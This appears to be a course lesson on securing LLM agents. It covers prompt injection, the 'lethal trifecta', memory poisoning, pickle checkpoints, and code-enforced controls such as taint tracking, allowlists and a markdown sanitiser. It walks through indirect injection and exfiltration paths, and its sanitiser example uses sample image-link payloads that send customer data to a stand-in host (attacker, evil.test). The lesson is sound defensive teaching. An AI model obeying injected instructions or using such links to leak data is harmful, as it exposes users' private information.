---
id: ai-security
module: security-governance-compliance
name: AI security
kind: concept
difficulty: intro
est_minutes: 13
status: agentic-verified
agent_relevance: core
related:
  - security-governance-compliance/threat-modeling
  - security-governance-compliance/prompt-injection-defense
  - security-governance-compliance/zero-trust
  - safety-security/owasp-top-10-for-llms
  - safety-security/prompt-injection
  - safety-security/excessive-agency
  - safety-security/supply-chain-security-for-models-and-datasets
  - agent-reliability/tool-permissions-and-least-privilege
sources:
  - OWASP, 2025 — Top 10 for LLM Applications
  - MITRE — ATLAS (Adversarial Threat Landscape for AI Systems)
  - NIST, 2023 — AI Risk Management Framework (AI RMF 1.0)
  - Greshake et al., 2023 — Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection
---

## TL;DR
An agent is an untrusted interpreter holding your credentials: it obeys instructions hidden in pages,
emails and tool results, and cannot be patched like a parser. Secure it with least privilege, isolation,
output handling, approval gates and monitoring, not cleverer prompts.

## For agent builders
- **Why it matters for agents.** Every tool you add widens what a steered model can do. A chatbot that
  misbehaves is embarrassing; an agent that reads a poisoned page and then calls `send_email` with your
  credentials is a breach.
- **Where it shows up in your stack.** The tool dispatcher (allowlists, ceilings, taint), the identity the
  agent's tools run as, the sandbox's egress policy, the chat UI's markdown renderer, memory writes, and
  the logs and traces that copy every prompt.
- **What you control.** Which tools a session gets, what each tool's code refuses regardless of the model,
  which calls need a human with the real arguments, and per-session budgets on tokens, tool calls and
  loop steps.
- **What you can skip.** Memorising every OWASP or ATLAS entry. Learn the three facts and the trifecta
  test; they let you review any agent design in minutes and pick the deeper lessons that apply.

## Why it exists
Three things changed when an LLM went into the system.
- **Control and data share one channel.** A parser has a grammar: `'; DROP TABLE` is data until you
  concatenate it into SQL, and parameterised queries end the argument. A transformer has one token stream:
  system prompt, user message, retrieved PDF and tool JSON are all tokens with attention between them,
  and no hardware notion of which tokens may give orders. Anything it reads can steer it.
- **Failure is probabilistic and not patchable in the usual sense.** Fix a parser bug and the class is
  gone. Find a jailbreak and you add training data or a filter; the attack mostly stops, for a while, in
  that phrasing. There is no proof of absence, and an attacker with unlimited attempts eventually gets
  through a probabilistic filter.
- **Models are being given agency.** Browsing, email, code execution, database access, payment APIs. A
  chatbot that says something embarrassing is a PR problem; an agent that reads a poisoned web page and
  then acts with your credentials is a breach.
- **The naive responses fail for the same reason.** "Add a guardrail prompt" uses the instruction-following
  component to defend itself. "Our WAF already inspects requests" fails because the payload is natural
  language, not a signature. "The vendor handles safety" confuses the vendor's content policy with your
  authorisation boundary; the vendor does not know which of your users may issue refunds.
- **So the attack surface moves.** From syntax (SQL, HTML) to semantics (any text the model reads), and
  from the model to everything around it: credentials, tools and downstream systems.

## How it works
### What you are protecting
| Asset | Why it matters |
|---|---|
| Data | Training sets, retrieval corpora, conversation logs; logs are often the most sensitive store you own |
| The model | Weights, fine-tunes and the system prompt, both as IP and as a map of your controls |
| Compute | The GPU bill |
| Actions | Every tool and credential the model can reach |
| Decisions | What users and downstream systems trust the output for |

### Where attacks enter, by lifecycle
- **Supply chain and training time.** Weights from a hub (pickle-based checkpoints run code on load,
  which is why safetensors exists), poisoned fine-tune or pre-training data, malicious dependencies,
  tampered datasets. Covered in depth in the supply-chain lesson.
- **Inference-time input.** Direct prompt injection and jailbreaks (the user attacks the system);
  indirect prompt injection (content the model reads attacks the user, as Greshake et al. demonstrated
  against real deployed applications); and poisoning of the retrieval corpus so injected content is
  retrieved later.
- **Inference-time output.** Improper output handling: model text flowing unescaped into HTML, SQL, a
  shell or a tool call. Excessive agency: the model holding more permissions than the task needs.
- **Exfiltration and privacy.** System prompt leakage; training data extraction (Carlini et al. recovered
  verbatim memorised training sequences, including personal contact details, from GPT-2, and Nasr et al.
  later extended extraction to a deployed chat model); cross-tenant leakage through shared indexes or
  caches; membership inference.
- **Availability and cost.** Unbounded consumption, sometimes called denial of wallet, via long inputs,
  recursive agent loops or expensive tool calls triggered by injected content.
- **Model theft.** Approximating a model by querying its API at scale.

### The three facts to design around
1. **Any text the model reads may act as an instruction.** So trust boundaries are drawn around content
   sources, not around the model.
2. **The model will be steered some fraction of the time.** So security comes from what a steered model
   cannot do, not from what it is told not to do.
3. **Output is attacker-influenced.** So treat it as untrusted input to everything downstream.

### The composition test (the "lethal trifecta")
A data-theft attack needs three things in one session (Simon Willison's "lethal trifecta"):
1. **Untrusted content** that can carry the instruction.
2. **Access to something worth stealing.**
3. **A channel out:** an email, a fetched URL, a rendered image, a write to a shared document.

- **Each capability is harmless alone; the breach is in the combination.** So a review looks at the whole
  agent, not each tool in isolation.
- **The strongest fix removes one leg in code.** The prompt-injection-defense lesson turns this into a
  policy (the "rule of two").
- **Persistence is its own sink.** An agent with long-term memory, a shared notes store or write access to
  the knowledge base can be made to write the injected instruction where it is read again. One poisoned
  page becomes an attack on every later session, so memory writes are a sink to gate, not a convenience.

### The controls that follow
| Control | What it means | Why |
|---|---|---|
| Identity and least privilege | The agent acts with at most the user's permissions, scoped per task, short-lived credentials, read-only unless writing is the job | Bounds the damage of fact 2 |
| Isolation | Sandboxed code execution, egress allowlists, no secrets in the context window | A secret the model can see is a secret that can be printed |
| Input side | Tag the provenance of each context segment; run classifiers on untrusted content | Classifiers are a signal, not a boundary |
| Output side | Schemas and validation, escaping before rendering, allowlisted URLs and recipients, no auto-rendered images or links | Auto-rendered images are a standard exfiltration channel |
| Human approval | For consequential or irreversible actions, shown with the actual arguments | A human cannot judge what they cannot see |
| Monitoring | Log prompts, tool calls and content sources; detect anomalies; canary strings in system prompts | Makes leakage observable |
| Supply chain | Pinned versions, signed artifacts, safetensors, dataset scanning | Weights and data are code-like inputs |

### The frameworks and what each is for
| Framework | What it is | Use it to |
|---|---|---|
| OWASP Top 10 for LLM Applications | Vulnerability classes: prompt injection, sensitive information disclosure, supply chain, data and model poisoning, improper output handling, excessive agency, system prompt leakage, vector and embedding weaknesses, misinformation, unbounded consumption | Seed a review |
| MITRE ATLAS | Attacker tactics and techniques against ML systems in the style of ATT&CK, with case studies | Threat modeling and red-team planning |
| NIST AI RMF | Govern, map, measure, manage | Organisational risk management, not technical controls |

- **Where the depth lives.** The safety-security module covers each attack class in depth; this module
  adds the layers around them: threat modeling, policy, classification, residency and governance.

## Diagram
Follow one injected instruction: it enters with untrusted content, and only code-enforced limits and
gates stand between a steered model and a side effect.

```mermaid
flowchart TD
    U["User request"] --> M["Model in the loop"]
    W["Untrusted content: web, email, RAG"] -->|"may carry instructions"| M
    M -->|"proposed tool call"| L{"Hard limits in code"}
    L -->|"outside allowlist or ceiling"| X["Blocked"]
    L -->|"within limits"| T{"Turn tainted?"}
    T -->|"no, or read-only"| D["Dispatch tool"]
    T -->|"yes and external"| H{"Human approves exact args?"}
    H -->|"yes"| D
    H -->|"no"| X
    D --> O["Output: validate, escape, strip links"]
    D -.->|"read_url sets taint"| T
```

## Examples
### A tool boundary that encodes the three facts
- **Reading untrusted content taints the turn.**
- **A tainted turn cannot cause an external side effect** without a human approving those exact arguments.
  An approval is keyed on tool plus arguments, so approving one email does not pre-approve the next.
- **Argument limits hold no matter what the model says** (recipient allowlist, refund ceiling), because
  they are checked in code the model cannot reach.

```python
from dataclasses import dataclass, field

@dataclass
class Turn:
    user_id: str
    tainted: bool = False                       # set once any untrusted content entered the context
    approvals: set = field(default_factory=set)  # (tool, args) pairs a human has approved

TOOLS = {
    "search_tickets": {"effect": "read"},
    "read_url":       {"effect": "read", "taints": True},
    "send_email":     {"effect": "external"},
    "issue_refund":   {"effect": "external", "max_amount": 200},
}
ALLOWED_DOMAINS = {"example.com"}

def dispatch(name, args):                       # real tool implementations live behind this
    return {"ok": True}

def run_tool(turn: Turn, name: str, args: dict, approve):
    spec = TOOLS[name]
    if name == "send_email" and args["to"].rsplit("@", 1)[-1] not in ALLOWED_DOMAINS:
        raise PermissionError("recipient outside allowlist")     # exfiltration channel closed regardless of model
    if name == "issue_refund" and args["amount"] > spec["max_amount"]:
        raise PermissionError("amount above tool ceiling")        # the model cannot talk its way past this
    key = (name, tuple(sorted(args.items())))
    if spec["effect"] == "external" and turn.tainted and key not in turn.approvals:
        if not approve(turn.user_id, name, args):                 # a human sees the actual arguments
            raise PermissionError("not approved")
        turn.approvals.add(key)                                   # this call only, not the whole tool
    result = dispatch(name, args)
    if spec.get("taints"):
        turn.tainted = True                                       # everything after this is suspect
    return result

t = Turn(user_id="u42")
run_tool(t, "read_url", {"url": "https://example.com/faq"}, approve=lambda *a: False)
try:
    run_tool(t, "send_email", {"to": "x@example.com", "body": "hi"}, approve=lambda *a: False)
except PermissionError as e:
    print(e)   # "not approved": the turn read untrusted content, so sending needs a human
```

Two design choices are worth noticing:
- **Hard limits run before the approval check.** A human approving a 5,000 refund under time pressure is
  exactly what an attacker hopes for; some limits should not be approvable at all.
- **Taint is per turn and binary, which is coarse.** It over-gates turns where the untrusted content was
  irrelevant to the action. It under-protects if the agent's memory carries injected text into a fresh,
  "clean" turn, so a real system must taint whatever is loaded from stores that untrusted content can
  write to.

### Closing the rendered-image exfiltration channel
Fact 3 in practice: strip markdown images and links whose host is not allowlisted before the chat UI
renders model text, so an injected `![x](https://attacker/?d=...)` cannot leak data in a query string.

```python
import re
from urllib.parse import urlparse

ALLOWED_HOSTS = {"docs.example.com"}
MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(([^)\s]+)[^)]*\)")
MD_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(([^)\s]+)[^)]*\)")

def is_safe(url):
    u = urlparse(url)
    return u.scheme == "https" and u.hostname in ALLOWED_HOSTS

def sanitize(text):
    text = MD_IMAGE.sub(lambda m: m.group(0) if is_safe(m.group(2)) else "[image removed]", text)
    text = MD_LINK.sub(lambda m: m.group(0) if is_safe(m.group(2)) else m.group(1), text)
    return text

reply = ("Your order shipped. ![s](https://evil.test/p.png?d=order+4411+jane@x.com) "
         "Details: [tracking](https://evil.test/t) and [help](https://docs.example.com/ship).")
print(sanitize(reply))
# Your order shipped. [image removed] Details: tracking and [help](https://docs.example.com/ship).
```

- **This is defence in depth, not the boundary.** Raw HTML, other markup and tool-side channels (email,
  URL fetches) need their own controls; pair it with a restrictive image policy in the UI.

### Worked review: applying the trifecta to a support agent
| Tool | Untrusted content? | Sensitive access? | Channel out? |
|---|---|---|---|
| `read_inbox` (customer emails) | yes | yes | no |
| `query_orders` (shared service account) | no | yes, every customer | no |
| `send_email` (any recipient) | no | no | yes |
| Markdown rendering in the agent UI | no | no | yes, via images |

- **All three legs are present in one session**, so a single injected email can read another customer's
  orders and mail them out.
- **Remove a leg in code:** scope `query_orders` to the requesting user, allowlist `send_email` recipients
  to the ticket's customer, and strip remote images. Each change alone breaks the chain; all three give
  depth.

## Production patterns
- **On-behalf-of tool identity.** When an agent calls internal APIs, exchange the user's token for a
  short-lived, narrowly scoped one (OAuth 2.0 token exchange, RFC 8693) instead of a shared service
  account. Monitor tool calls denied for authorisation and any call made without a user subject.
- **Egress allowlist for agent sandboxes.** Code execution and browsing run with default-deny outbound
  network policy and an allowlisting proxy. Monitor blocked egress attempts per session; a spike after
  reading a document is a strong injection signal.
- **Canary strings in system prompts.** Embed a unique random marker in each system prompt version and
  scan outputs and logs for it. Monitor canary hits as a leakage alert, and rotate the marker with the
  prompt.
- **Safe weight loading as a CI gate.** Accept only safetensors from approved sources, pin by hash, and
  in PyTorch load any remaining checkpoints with `torch.load(path, weights_only=True)`. Monitor the gate's
  rejections and any model artifact loaded outside the registry.
- **Per-session consumption budgets.** Cap input tokens, output tokens, tool calls per turn and agent loop
  steps, enforced in the orchestrator, against denial of wallet. Monitor cost per user and budget-hit
  rate, alerting on outliers.

## Trade-offs
- **Least privilege and approval gates vs autonomy.** They bound the blast radius but cost autonomy; the
  gate is worth it when an action is irreversible or external, and becomes friction theatre when applied
  to read-only tools.
- **Input filters and classifiers vs real boundaries.** They catch cheap attacks and give telemetry, but
  every filter is bypassable; treat them as reducing volume rather than as a boundary unless the attacker
  has no incentive to retry.
- **Self-hosting vs vendor exposure.** Self-hosting removes vendor data exposure but moves supply-chain,
  patching and jailbreak-fix burden onto you; the balance flips when you have no in-house ML operations
  capacity.
- **Full prompt logging vs a new sensitive store.** Logging full prompts gives forensic ability but creates
  a new sensitive store; it flips to redacted logging as soon as prompts carry regulated data.

## Pitfalls
- **Treating the system prompt as a security control** ("never reveal these instructions"). Symptom: the
  prompt appears on social media within days of launch. Fix: assume it is public; keep secrets and
  enforcement out of it.
- **Giving the agent a service account broader than the user's rights.** Symptom: a user asks the
  assistant for a record they cannot open themselves and receives it. Fix: on-behalf-of identity.
- **Rendering model output as markdown with remote images or auto-links enabled.** Symptom: outbound
  requests to unknown domains carrying conversation text in query strings. Fix: sanitise and allowlist.
- **Loading weights from an unverified hub in a pickle-based format.** Symptom: arbitrary code runs at
  load time, usually discovered only in the incident review. Fix: safetensors and a registry.
- **Letting the agent write to its own long-term memory without gating.** Symptom: a behaviour change (an
  odd instruction followed, a link inserted) that persists across sessions after one bad page was read.
  Fix: gate memory writes on tainted turns and record each entry's source.
- **Securing the chat UI and forgetting the logs, traces and eval datasets that duplicate every prompt.**
  Symptom: customer PII found in an observability SaaS during an audit. Fix: redact before export and
  give those stores the same retention and access rules as the data they copy.

## When to use
This lesson is the map; use it on day one of any AI project to decide which deep lessons apply.
- **Ask four questions of any design:** what untrusted content reaches the model, what can the model do,
  what can its output reach, and where does the data go afterwards.
- **Measure:** the number of side-effecting tools without a gate, the share of context that comes from
  untrusted sources, and the time to revoke an agent's credentials.
- **Interviews:** "how is securing an LLM application different from securing a web application" is the
  standard opener; the three facts above are the expected answer, and listing prompt tricks instead
  signals inexperience.

## Role lens
- **Engineer:** Implements the tool boundary, output validation, provenance tagging and safe weight
  loading, and writes red-team cases into the evaluation suite so regressions are caught.
- **Architect:** Draws the trust boundaries, decides the agent's identity and permission model, chooses
  which frameworks drive reviews, and owns the vendor data-handling decision.
- **FDE:** Maps the customer's existing controls (SSO, DLP, network policy) onto the AI deployment and
  explains to their security team why a WAF does not cover prompt injection.

## Check yourself
**Q:** A product team says their support agent is safe because the system prompt forbids revealing other
customers' data and a moderation classifier screens inputs. The agent queries the orders database with a
shared service account and reads customer emails. What is wrong with this reasoning, and what would you
change first?
**A:** Both controls sit on the instruction-following side of the boundary; neither changes what a steered
model can do. The agent reads untrusted content (emails), so indirect injection must be assumed, and the
shared service account means a steered agent can read any order, leaving the prompt as the only thing
between an injected email and a cross-customer leak. The classifier reduces volume but gives no guarantee
against a motivated attacker with repeated attempts. First change: make the database tool enforce the
requesting user's identity (row-level scoping or an on-behalf-of token) so the model cannot ask for data
the user could not read. Second, treat email content as tainted and gate external actions. Keep the
classifier and prompt as defence in depth, with logging to detect attempts.

## Interview questions
### How is securing an LLM application different from securing a web application?
- **One channel for control and data.** Any text the model reads may act as an instruction, so there is no
  parameterised-query equivalent; trust boundaries go around content sources.
- **Probabilistic failure.** The model will be steered some fraction of the time, so controls must limit
  what a steered model can do.
- **Output is untrusted.** It feeds HTML, SQL, shells and tools, so it is validated and escaped like user
  input.

### An agent reads web pages, can query a CRM and can send email. How would you review it?
- **Run the trifecta test.** Untrusted content (web), sensitive access (CRM) and a channel out (email) in
  one session means one injected page can exfiltrate CRM data.
- **Remove a leg in code:** allowlist recipients, scope CRM access to the user, or split browsing into a
  session without CRM access.
- **Then add depth:** taint tracking, approval for external sends with the real arguments, and logging of
  content sources per tool call.

### When would you not put a human approval gate on a tool?
- **On read-only or easily reversible tools.** Gating them adds friction theatre, trains approvers to
  click yes, and buys little because the damage is bounded.
- **Gate irreversible or external effects instead**, and for some limits (a refund ceiling, a recipient
  allowlist) do not offer approval at all, because a hurried human is what an attacker hopes for.

### Why do safetensors exist, and what would you check before loading a model from a hub?
- **Pickle-based checkpoints execute code on load**, so an untrusted file is effectively an untrusted
  program; safetensors stores only tensors.
- **Before loading:** an approved source, a pinned revision and hash, safetensors format, and a scan of
  any accompanying code or datasets, all enforced in CI rather than by convention.

### What would you monitor in production to detect AI-specific attacks?
- **Canary hits** for system prompt leakage, and **blocked egress** from sandboxes after untrusted content.
- **Tool-call anomalies:** unusual recipients, denied authorisation, side effects on tainted turns.
- **Cost outliers** per user or session, which signal denial of wallet or recursive agent loops triggered
  by injected content.

### Your agent gained long-term memory last sprint. What new risk did that add, and how do you contain it?
- **Persistence became a sink.** One injected page can make the agent write an instruction into memory,
  which is then loaded into every later session, so the attack outlives the turn that carried it.
- **Contain it in code:** gate memory writes on tainted turns, record each entry's provenance, and taint
  any turn that loads memory untrusted content could have written.
- **Make it observable:** log memory writes with their source, and give users and operators a way to list
  and delete entries.

## Quiz
### Q: Why can't prompt injection be fixed the way SQL injection was fixed with parameterised queries?
- [ ] Models are too large to retrain with a fixed grammar
- [x] A transformer consumes one token stream with no structural distinction between instructions and data, so there is no separate channel to enforce
- [ ] Vendors do not expose the tokenizer needed to escape input correctly
- [ ] Prompt injection only works against open-weight models
> Parameterised queries work because SQL has a grammar and the driver keeps data out of the code channel.
> The model has no such channel; any token can influence attention. Vendor training for instruction
> hierarchy reduces success rates but cannot eliminate the mechanism.

### Q: Which control most directly limits the damage from an indirect prompt injection in an email-reading agent?
- [ ] A system prompt instructing the model to ignore instructions found in emails
- [ ] A longer context window so the model sees more legitimate context
- [x] Requiring human approval, or a recipient allowlist, before the agent can send anything externally
- [ ] Lowering the sampling temperature so outputs are deterministic
> Injection cannot be reliably prevented at input time, so the effective control bounds what a steered
> model can do. Closing the exfiltration channel removes the attacker's payoff; the prompt instruction is
> advisory and temperature changes nothing about trust.

### Q: Which of these is an AI-specific supply-chain risk rather than a classical one?
- [ ] An outdated TLS library in the serving container
- [x] Model weights distributed in a pickle-based format that executes code when loaded
- [ ] A leaked cloud API key in a CI log
- [ ] An unpinned Python dependency with a known CVE
> Pickle-based checkpoints deserialise arbitrary objects, so loading a model from an untrusted hub can
> execute attacker code; safetensors stores only tensors. The other three are ordinary software
> supply-chain issues that AI systems also inherit.

## Use cases & projects
### Use cases
- **Launch review of a customer support agent.** Run the trifecta table over its tools before go-live and
  remove one leg in code for each path from untrusted content to a channel out.
- **Browsing and research agents.** Default-deny egress plus taint tracking stops a fetched page from
  turning the agent into an exfiltration client.
- **Internal copilots over company data.** On-behalf-of identity keeps the assistant from returning
  records the asking employee could not open themselves.
- **Agent platforms serving many tenants.** Safe weight loading for self-hosted models, pinned tool and
  model artifacts, and per-session budgets bound supply-chain and denial-of-wallet exposure for every
  tenant.

### Mini project
**Harden a three-tool agent against indirect injection (2-3 hours).**
- **Goal:** show that a steered model cannot exfiltrate data once the tool boundary is in code.
- **Steps:** build an agent with `read_url`, `query_orders` and `send_email` (fakes are fine); plant an
  injected instruction in a test page; run it once with no boundary and log the leak; then add the
  `run_tool` checks from this lesson (recipient allowlist, taint, approval keyed on exact arguments) and
  the markdown sanitiser, and rerun.
- **Done when:** the unprotected run leaks and the protected run blocks the send with a logged reason,
  and you can name which trifecta leg each control removed.
